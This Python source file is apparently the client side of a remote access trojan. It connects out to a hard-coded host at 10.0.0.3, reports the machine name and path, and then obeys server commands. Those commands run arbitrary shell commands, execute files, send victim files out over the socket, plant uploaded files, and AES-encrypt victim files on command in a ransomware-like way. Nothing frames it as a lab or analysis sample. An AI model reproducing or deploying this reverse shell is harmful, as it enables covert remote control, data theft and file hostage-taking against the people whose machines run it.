import socket
import os
import subprocess
import sys
from AES import AES_Crypto

SERVER_HOST = "10.0.0.3"
SERVER_PORT = int(sys.argv[1])
print(SERVER_PORT)


msg = ""
disks = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'

so = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# connect to the server
so.connect((SERVER_HOST, SERVER_PORT))
path = os.path.abspath(os.getcwd()) + "\\"


so.send(os.environ['COMPUTERNAME'].encode())
so.send(b" " + path.encode())

def Check_If_File_Exsists(command):
    if(len(command.split(" ")) > 2):
        return False
    file = command.split(" ")[1]
    flag = False, " "
    print(path + file)
    if (os.path.isfile(path + file)):
        file = path + file
        return True, file
    if (os.path.isfile(file)):
        return True, file
    return False, " "


while True:
    # receive the command from the server
    command = so.recv(1024).decode()
    print(command)
    if command == "exit":
        break
    elif command[0:2] == 'cd':
        print (123)
        if(command == "cd .."):
            print(123)
            spl = path.split('\\')
            print(spl)

            if(len(spl) > 2):
                path = ""
                for x in range(0, len(spl) -2):
                    path += spl[x] + "\\"
                msg = 'PATH ' + path
            else:
                msg = "You are in the root of your disc!"

        else:
            path_to_go = command.split(" ")[1]
            if(path_to_go[0] == '"' and path_to_go[-1] == '"'):
                path_to_go = path_to_go[1:-1]
            if os.path.isdir(path + "\\" + path_to_go):
                path = path + path_to_go + "\\"
                msg = 'PATH ' + path
            elif (os.path.isdir(path_to_go)):
                path = path_to_go + "\\"
                msg = 'PATH ' + path
            else:
                msg = "Invalid path!"
        print (msg)
        so.send(msg.encode())
    elif command[0:7] == 'execute':
        print (path + command[8:])
        if(os.path.isfile(path + command[8:])):
            print(123)
            os.system(path + command[8:])
            msg = "Exited!"
            so.send(msg.encode())
    elif command[0:5] == 'shell':
        proc  = ""
        if(command[6:] == 'dir'):
            proc = subprocess.Popen(command[6:] + ' "' + path + '"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        else:
            proc = subprocess.Popen(command[6:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout_val = proc.stdout.read() + proc.stderr.read()
        print(stdout_val)
        so.send(stdout_val)


    elif command[0:8] == 'download':
        if(os.path.isfile(path + command[9:])):
            msg = "DOWNLOAD"
            so.send(msg.encode())
            print(path + command[9:])
            file = open(path + command[9:], 'rb')
            fl = file.read(1024)
            while fl:
                print(fl)
                so.send(fl)
                fl = file.read(1024)
            so.send('EOF'.encode())


        else:
            msg = 'Invalid file name!'
            so.send(msg.encode())

    elif command[0:7] == 'encrypt':
        flag, file = Check_If_File_Exsists(command)
        if(flag):
            so.send("encrypt".encode())
            enc = AES_Crypto()
            key = enc.Create_key(file)
            enc.Encrypt_File(file, key)
            msg = "Your file has been encrypted! \nNOTE: Your key is " + key + "\n" + "Use it to decrypt the file!"
            so.send(msg.encode())
            if(so.recv(1024).decode() == 'YES'):
                so.send(str("File's place : " + file[0: file.rfind('.')] + "\n" + "Decryption KEY: " + key).encode())
        else:
            so.send("Invalid file/ path to the file".encode())

    elif command[0:7] == 'decrypt':
        flag, file = Check_If_File_Exsists(command)
        if (flag):
            so.send("decrypt".encode())
            key = so.recv(1045).decode()
            enc = AES_Crypto()
            dec_file = enc.Decrypt_File(file, key)
            so.send(dec_file.encode())
        else:
            so.send("Invalid file/ path to the file".encode())


    elif command[0:6] == 'Upload':
        flag = os.path.isdir(command.split(" ")[1])
        if (flag):
            so.send("Good".encode())
            file = open(command.split(" ")[1] + "\\" + command.split(" ")[2], 'wb')
            while True:
                l = so.recv(1024)
                print(l)
                if 'EOF' in l.decode():
                    break
                file.write(l)
                print("\n" + l.decode())
            file.close()
            so.send("The file Has been uploaded".encode())

        else:
            so.send("INVALID FILE".encode())

    elif command[0:6] == 'change':
        drives = ['%s:' % d for d in disks if os.path.exists('%s:' % d)]
        if command[7:] in drives:
            path = command[7:] + "\\"
            so.send('PATH '.encode() + path.encode())
        else:
            so.send("Invalid Disk!".encode())



    else:
        msg = 'Invalid command !'
        so.send(msg.encode())

so.close()